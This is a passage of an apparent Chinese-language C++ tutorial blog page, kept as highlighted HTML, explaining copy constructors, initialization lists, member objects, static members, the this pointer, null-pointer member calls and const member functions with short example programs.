&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">m_age = age;</span><br><span class="line">m_height = new <span class="type">int</span>(height);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拷贝构造函数</span></span><br><span class="line">Person(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//如果不利用深拷贝在堆区创建新内存，会导致浅拷贝带来的重复释放堆区问题</span></span><br><span class="line">m_age = p.m_age;</span><br><span class="line">m_height = new <span class="type">int</span>(*p.m_height);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (m_height != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">delete m_height;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_age;</span><br><span class="line"><span class="type">int</span>* m_height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">18</span>, <span class="number">180</span>)</span>;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p2</span><span class="params">(p1)</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1的年龄： &quot;</span> &lt;&lt; p1.m_age &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; *p1.m_height &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2的年龄： &quot;</span> &lt;&lt; p2.m_age &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; *p2.m_height &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p></blockquote><h4 id="4-2-6-初始化列表">4.2.6 初始化列表</h4><p><strong>作用：</strong></p><p>C++提供了初始化列表语法，用来初始化属性</p><p><strong>语法：</strong><code>构造函数()：属性1(值1),属性2（值2）... &#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="comment">////传统方式初始化</span></span><br><span class="line"><span class="comment">//Person(int a, int b, int c) &#123;</span></span><br><span class="line"><span class="comment">//m_A = a;</span></span><br><span class="line"><span class="comment">//m_B = b;</span></span><br><span class="line"><span class="comment">//m_C = c;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列表方式初始化</span></span><br><span class="line">Person(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c) :m_A(a), m_B(b), m_C(c) &#123;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintPerson</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;mB:&quot;</span> &lt;&lt; m_B &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;mC:&quot;</span> &lt;&lt; m_C &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line"><span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span>;</span><br><span class="line">p.PrintPerson();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-7-类对象作为类成员">4.2.7 类对象作为类成员</h4><p>C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span>&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    A a；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B 类中有对象 A 作为成员，A 为对象成员</p><p>那么当创建 B 对象时，A 与 B 的构造和析构的顺序是谁先谁后？</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Phone</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">Phone(<span class="built_in">string</span> name)</span><br><span class="line">&#123;</span><br><span class="line">m_PhoneName = name;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Phone构造&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~Phone()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Phone析构&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> m_PhoneName;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列表可以告诉编译器调用哪一个构造函数</span></span><br><span class="line">Person(<span class="built_in">string</span> name, <span class="built_in">string</span> pName) :m_Name(name), m_Phone(pName)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person构造&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person析构&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">playGame</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m_Name &lt;&lt; <span class="string">&quot; 使用&quot;</span> &lt;&lt; m_Phone.m_PhoneName &lt;&lt; <span class="string">&quot; 牌手机! &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> m_Name;</span><br><span class="line">Phone m_Phone;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//当类中成员是其他类对象时，我们称该成员为 对象成员</span></span><br><span class="line"><span class="comment">//构造的顺序是 ：先调用对象成员的构造，再调用本类构造</span></span><br><span class="line"><span class="comment">//析构顺序与构造相反</span></span><br><span class="line">Person <span class="title function_">p</span><span class="params">(<span class="string">&quot;张三&quot;</span> , <span class="string">&quot;苹果X&quot;</span>)</span>;</span><br><span class="line">p.playGame();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-8-静态成员">4.2.8 静态成员</h4><p>静态成员就是在成员变量和成员函数前加上关键字 static，称为静态成员</p><p>静态成员分为：</p><ul><li><p>静态成员变量</p><ul><li>所有对象共享同一份数据</li><li>在编译阶段分配内存</li><li>类内声明，类外初始化</li></ul></li><li><p>静态成员函数</p><ul><li>所有对象共享同一个函数</li><li>静态成员函数只能访问静态成员变量</li></ul></li></ul><p>**示例 1 ：**静态成员变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//静态成员变量特点：</span></span><br><span class="line"><span class="comment">//1 在编译阶段分配内存</span></span><br><span class="line"><span class="comment">//2 类内声明，类外初始化</span></span><br><span class="line"><span class="comment">//3 所有对象共享同一份数据</span></span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> m_B; <span class="comment">//静态成员变量也是有访问权限的</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> Person::m_B = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1、通过对象</span></span><br><span class="line">Person p1;</span><br><span class="line">p1.m_A = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p1.m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">Person p2;</span><br><span class="line">p2.m_A = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p1.m_A &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//共享同一份数据</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2.m_A = &quot;</span> &lt;&lt; p2.m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、通过类名</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;m_A = &quot;</span> &lt;&lt; Person::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;m_B = &quot; &lt;&lt; Person::m_B &lt;&lt; endl; //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**示例 2：**静态成员函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态成员函数特点：</span></span><br><span class="line"><span class="comment">//1 程序共享一个函数</span></span><br><span class="line"><span class="comment">//2 静态成员函数只能访问静态成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">m_A = <span class="number">100</span>;</span><br><span class="line"><span class="comment">//m_B = 100; //错误，不可以访问非静态成员变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line"><span class="type">int</span> m_B; <span class="comment">//</span></span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态成员函数也是有访问权限的</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func2调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1、通过对象</span></span><br><span class="line">Person p1;</span><br><span class="line">p1.func();</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、通过类名</span></span><br><span class="line">Person::func();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person::func2(); //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-C-对象模型和-this-指针">4.3 C++对象模型和 this 指针</h3><h4 id="4-3-1-成员变量和成员函数分开存储">4.3.1 成员变量和成员函数分开存储</h4><p>在 C++中，类内的成员变量和成员函数分开存储</p><p>只有非静态成员变量才属于类的对象上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Person() &#123;</span><br><span class="line">mA = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//非静态成员变量占对象空间</span></span><br><span class="line"><span class="type">int</span> mA;</span><br><span class="line"><span class="comment">//静态成员变量不占对象空间</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> mB;</span><br><span class="line"><span class="comment">//函数也不占对象空间，所有函数共享一个函数实例</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; this-&gt;mA &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//静态成员函数也不占对象空间</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">sfunc</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">sizeof</span>(Person) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-3-2-this-指针概念">4.3.2 this 指针概念</h4><p>通过 4.3.1 我们知道在 C++中成员变量和成员函数是分开存储的</p><p>每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码</p><p>那么问题是：这一块代码是如何区分那个对象调用自己的呢？</p><p>c++通过提供特殊的对象指针，this 指针，解决上述问题。<strong>this 指针指向被调用的成员函数所属的对象</strong></p><p>this 指针是隐含每一个非静态成员函数内的一种指针</p><p>this 指针不需要定义，直接使用即可</p><p>this 指针的用途：</p><ul><li>当形参和成员变量同名时，可用 this 指针来区分</li><li>在类的非静态成员函数中返回对象本身，可使用 return *this</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Person(<span class="type">int</span> age)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1、当形参和成员变量同名时，可用this指针来区分</span></span><br><span class="line">this-&gt;age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person&amp; <span class="title function_">PersonAddPerson</span><span class="params">(Person p)</span></span><br><span class="line">&#123;</span><br><span class="line">this-&gt;age += p.age;</span><br><span class="line"><span class="comment">//返回对象本身</span></span><br><span class="line"><span class="keyword">return</span> *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person <span class="title function_">p1</span><span class="params">(<span class="number">10</span>)</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1.age = &quot;</span> &lt;&lt; p1.age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">p2</span><span class="params">(<span class="number">10</span>)</span>;</span><br><span class="line">p2.PersonAddPerson(p1).PersonAddPerson(p1).PersonAddPerson(p1);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2.age = &quot;</span> &lt;&lt; p2.age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-3-3-空指针访问成员函数">4.3.3 空指针访问成员函数</h4><p>C++中空指针也是可以调用成员函数的，但是也要注意有没有用到 this 指针</p><p>如果用到 this 指针，需要加以判断保证代码的健壮性</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//空指针访问成员函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowClassName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;我是Person类!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowPerson</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (this == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; mAge &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Person * p = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;ShowClassName(); <span class="comment">//空指针，可以调用成员函数</span></span><br><span class="line">p-&gt;ShowPerson();  <span class="comment">//但是如果成员函数中用到了this指针，就不可以了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-3-4-const-修饰成员函数">4.3.4 const 修饰成员函数</h4><p><strong>常函数：</strong></p><ul><li>成员函数后加 const 后我们称为这个函数为<strong>常函数</strong></li><li>常函数内不可以修改成员属性</li><li>成员属性声明时加关键字 mutable 后，在常函数中依然可以修改</li></ul><p><strong>常对象：</strong></p><ul><li>声明对象前加 const 称该对象为常对象</li><li>常对象只能调用常函数</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 